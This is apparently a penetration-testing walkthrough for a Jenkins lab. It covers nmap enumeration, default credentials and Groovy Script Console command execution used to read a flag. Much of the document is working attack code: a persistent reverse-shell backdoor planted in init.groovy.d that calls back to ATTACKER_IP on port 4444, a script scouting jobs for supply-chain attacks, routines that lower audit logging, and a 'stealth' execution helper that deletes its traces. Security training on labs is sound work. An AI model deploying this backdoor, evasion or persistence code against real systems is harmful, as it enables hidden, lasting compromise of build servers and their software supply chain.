# 🛰️ Jenkins Exploitation Walkthrough

## Introduction to Jenkins Security Assessment

[!INFO] This guide provides a comprehensive step-by-step methodology for assessing and exploiting vulnerabilities in Jenkins CI/CD servers using Groovy scripts and the Jenkins Script Console.

### 🌐 HTB Academy Lab Configuration
- **IP Address:** 10.10.196.235
- **Service:** Jenkins (8080)
- **OS:** Linux

## Discovery Phase: Enumeration & Fingerprinting

### Port Scanning and Service Identification

[!CHECK] Use Nmap to identify open ports and services on the target machine:

```bash
nmap -p- 10.10.196.235
```

Once you have identified that port `8080` is open, further enumerate it with HTTP service detection:

[!CHECK] 
```bash
nmap -sC -sV -oN nmap.txt 10.10.196.235 -p 8080
```

### API Endpoints and Interface Analysis

Review the web interface to identify Jenkins endpoints, version information, and potential misconfigurations.

[!CHECK] 
```bash
curl http://10.10.196.235:8080/
```

## Exploitation Phase: Script Console Access & Command Execution

### Initial Authentication and Configuration Review

Log in using default credentials or anonymous access to review configurations:

[!CHECK]
```
Username: admin
Password: admin
```

Navigate to the Jenkins dashboard and check for misconfigured settings.

### Groovy Script Abuse through Script Console

Access the Jenkins Script Console by navigating to `/script` endpoint after logging in. This console provides a powerful environment for executing arbitrary code, including system commands via Java or Groovy:

[!CHECK]
```bash
http://10.10.196.235:8080/script
```

### System Command Execution

Use the Script Console to execute shell commands and retrieve information from the Jenkins server.

#### Direct Shell Execution with `execute()`
```groovy
println java.lang.Runtime.getRuntime().exec('whoami').text
```

#### Directory Listing
```groovy
println new File('/var/lib/jenkins3/').list()
```

#### Flag Retrieval
```groovy
println new File('/var/lib/jenkins3/flag.txt').text
```

### Verification Commands

To confirm successful exploitation, run the following commands:

[!CHECK]
```groovy
verificationCommands = [
    "whoami",
    "cat /var/lib/jenkins3/",
    "cat /var/lib/jenkins3/flag.txt",
    "uname -a",
    "ps aux | grep jenkins"
]

verificationCommands.each { cmd ->
    println "\n[+] Command: $cmd"
    println "=" * 40
    def result = cmd.execute()
    result.waitFor()
    println result.text
}
```

## Post-Exploitation and Persistence

### Jenkins Backdoor Installation

#### Persistent Script Console Access

Install a persistent backdoor in Jenkins configuration to ensure continuous access:

```groovy
// Create persistent backdoor in Jenkins configuration
def installPersistentBackdoor() {
    try {
        def jenkins = Jenkins.instance
        def globalConfig = jenkins.getGlobalBuildDiscarder()
        
        // Create scheduled task for persistent access
        def cronExpression = "H/5 * * * *"  // Every 5 minutes
        
        def backdoorScript = '''
def executeBackdoor() {
    try {
        def socket = new Socket("ATTACKER_IP", 4444)
        def inputStream = socket.getInputStream()
        def outputStream = socket.getOutputStream()
        
        def buffer = new byte[1024]
        while (socket.isConnected()) {
            def bytesRead = inputStream.read(buffer)
            if (bytesRead > 0) {
                def command = new String(buffer, 0, bytesRead).trim()
                if (command == "exit") break
                
                def result = command.execute().text
                outputStream.write(result.getBytes())
                outputStream.flush()
            }
        }
        socket.close()
    } catch (Exception e) {
        // Silently fail
    }
}

executeBackdoor()
'''
        
        // Install as system Groovy script
        def initScript = new File(jenkins.getRootDir(), "init.groovy.d/backdoor.groovy")
        initScript.parentFile.mkdirs()
        initScript.text = backdoorScript
        
        println "[+] Persistent backdoor installed in init.groovy.d"
        println "[+] Backdoor will execute on Jenkins restart"
        
    } catch (Exception e) {
        println "Backdoor installation failed: ${e.getMessage()}"
    }
}

// installPersistentBackdoor()
```

#### Supply Chain Attack Preparation

Prepare for supply chain attacks through build modification:

```groovy
// Prepare for supply chain attacks through build modification
def prepareSupplyChainAttack() {
    try {
        def jenkins = Jenkins.instance
        def jobs = jenkins.getAllItems(hudson.model.Job.class)
        
        println "[+] Analyzing jobs for supply chain attack opportunities:"
        
        jobs.each { job ->
            println "\nJob: ${job.getName()}"
            
            // Check for deployment configurations
            if (job.hasProperty('publishers')) {
                job.getPublishers().each { publisher ->
                    println "  Publisher: ${publisher.class.simpleName}"
                    
                    // Look for deployment publishers
                    if (publisher.class.simpleName.contains("Deploy") || 
                        publisher.class.simpleName.contains("Publish")) {
                        println "  [!] Deployment capability detected"
                    }
                }
            }
            
            // Check for artifact archiving
            if (job.hasProperty('builders')) {
                job.getBuilders().each { builder ->
                    println "  Builder: ${builder.class.getSimpleName()}"
                    
                    if (builder.class.simpleName.contains("Archive") ||
                        builder.class.simpleName.contains("Artifact")) {
                        println "  [!] Artifact creation detected"
                    }
                }
            }
        }
        
    } catch (Exception e) {
        println "Supply chain analysis failed: ${e.getMessage()}"
    }
}

// prepareSupplyChainAttack()
```

## Defense Evasion and Operational Security

### Log Evasion Techniques

#### Jenkins Audit Log Manipulation
```groovy
// Jenkins log analysis and manipulation
def manipulateJenkinsLogs() {
    try {
        def jenkins = Jenkins.instance
        def loggerName = "hudson.model.Run"
        
        // Reduce logging verbosity for specific actions
        def logger = java.util.logging.Logger.getLogger(loggerName)
        logger.setLevel(java.util.logging.Level.WARNING)
        
        println "[+] Logging verbosity reduced for $loggerName"
        
        // Clear specific log entries if possible
        def logDir = new File(jenkins.getRootDir(), "logs")
        if (logDir.exists()) {
            println "[+] Jenkins log directory: ${logDir.absolutePath}"
            
            logDir.listFiles().each { logFile ->
                if (logFile.name.contains("audit") || logFile.name.contains("access")) {
                    println "  Log file: ${logFile.name} (${logFile.length()} bytes)"
                }
            }
        }
        
    } catch (Exception e) {
        println "Log manipulation failed: ${e.getMessage()}"
    }
}

// manipulateJenkinsLogs()
```

### Anti-Detection Measures

#### Stealth Command Execution
```groovy
// Stealth command execution with minimal footprint
def stealthExecution(String command) {
    try {
        // Execute command without creating obvious process traces
        def tempScript = File.createTempFile("sys", ".sh")
        tempScript.text = "#!/bin/bash\n$command\nrm -f ${tempScript.absolutePath}"
        tempScript.setExecutable(true)
        
        def proc = tempScript.absolutePath.execute()
        def result = proc.text
        proc.waitFor()
        
        // Clean up
        if (tempScript.exists()) {
            tempScript.delete()
        }
        
        return result
        
    } catch (Exception e) {
        return "Error: ${e.getMessage()}"
    }
}

// Usage:
// def result = stealthExecution("cat /var/lib/jenkins3/flag.txt")
// println result
```

## Professional Assessment Integration

### Jenkins Security Assessment Workflow

#### Discovery Phase
- [ ] **Service Identification** - Port scanning and Jenkins fingerprinting
- [ ] **Version Detection** - API endpoints and interface analysis
- [ ] **Authentication Testing** - Default credentials and anonymous access
- [ ] **Plugin Enumeration** - Security plugins and extension analysis

#### Exploitation Phase
- [ ] **Script Console Access** - Groovy command execution capability
- [ ] **Pipeline Manipulation** - Build process injection and modification
- [ ] **Credential Harvesting** - Stored secrets and API key extraction
- [ ] **Agent Compromise** - Build slave exploitation and lateral movement

#### Post-Exploitation Phase
- [ ] **Persistence Establishment** - Backdoor installation and maintenance
- [ ] **Supply Chain Preparation** - Production deployment access
- [ ] **Lateral Movement** - Network traversal through Jenkins connectivity
- [ ] **Data Exfiltration** - Source code and credential extraction

---

## Next Steps

After mastering Jenkins exploitation:

1. 🛰️ [[GitLab Discovery & Attacks]](gitlab-discovery-attacks.md) - Exploiting GitLab for source code management.
2. 🛰️ [[CI/CD Pipeline Security]](cicd-pipeline-security.md) - Advanced CI/CD pipeline attacks and exploitation techniques.
3. 🛰️ [[Splunk Discovery & Attacks]](splunk-discovery-attacks.md) - Exploiting Splunk for monitoring infrastructure.

# 🌟 Conclusion
This guide provides a detailed walkthrough of how to assess, exploit, and maintain persistence on Jenkins CI/CD servers using Groovy scripts in the Script Console. Follow these steps to effectively perform security assessments on similar targets and enhance your penetration testing skills.

---

[!INFO] For further learning and practical exercises, refer to additional resources such as HTB Academy labs or real-world scenarios to deepen your understanding of CI/CD server security vulnerabilities.